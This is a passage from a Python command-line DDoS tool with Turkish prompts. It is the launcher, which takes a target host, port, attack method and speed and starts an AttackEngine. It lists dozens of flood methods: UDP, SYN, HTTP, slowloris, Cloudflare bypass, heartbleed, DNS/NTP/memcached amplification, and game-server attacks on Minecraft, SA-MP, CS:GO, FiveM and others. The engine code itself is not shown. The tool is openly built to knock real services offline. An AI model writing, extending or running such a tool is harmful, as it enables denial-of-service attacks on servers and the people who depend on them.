    elif os.name == "nt": os.system('cls')
    show_logo_and_boxes()

    if len(sys.argv) == 2 and 'help' in sys.argv[1].lower():
        show_help()

    try:
        if len(sys.argv) < 4:
            user_input = prompt()
            if "help" in user_input.lower() or "-h" in user_input.lower():
                show_help()
            parts = user_input.split()
            if len(parts) < 3:
                print(Fore.RED + "Eksik parametre!")
                sys.exit()
            raw_input, port, method_input = parts[0], int(parts[1]), parts[2].strip().lower()
            hiz = int(parts[3]) if len(parts) > 3 else 50
        else:
            raw_input = sys.argv[1]
            port = int(sys.argv[2])
            method_input = sys.argv[3].lower()
            hiz = int(sys.argv[4]) if len(sys.argv) > 4 else 50

        valid_methods = [
            '!udp', '!udpmulti', '!udpfrag', '!tcp', '!syn', '!ack', '!rst',
            '!http', '!httppost', '!head', '!options', '!put', '!delete', '!trace',
            '!slowloris', '!overflow', '!httpall',
            '!bypass', '!cfbypass', '!tls', '!tlspost', '!tlsreneg', '!heartbleed',
            '!bypassall', '!tlsall',
            '!dns', '!ntp', '!ssdp', '!memcached', '!chargen', '!amp',
            '!mc', '!mcquery', '!samp', '!samprcon', '!csgo', '!csgoamp',
            '!rust', '!gta5', '!fivem', '!game',
            '!all', '!max'
        ]
        
        if method_input not in valid_methods:
            print(Fore.LIGHTRED_EX + f"[!] Geçersiz yöntem: {method_input}")
            print(Fore.LIGHTRED_EX + f"[!] Geçerli olanlar: {', '.join(valid_methods)}")
            sys.exit()

        hiz = max(1, min(999, hiz))
        clean_host = raw_input.replace("http://", "").replace("https://", "").split("/")[0]
        
        engine = AttackEngine(clean_host, port, method_input, hiz)
        engine.start_attack()

    except (ValueError, IndexError) as e:
        print(Fore.RED + f"\n Hata: {e}")
        print(Fore.YELLOW + " Doğru kullanım: <hedef> <port> <yöntem> <hız>")
        print(Fore.YELLOW + "write 'help'")
        sys.exit()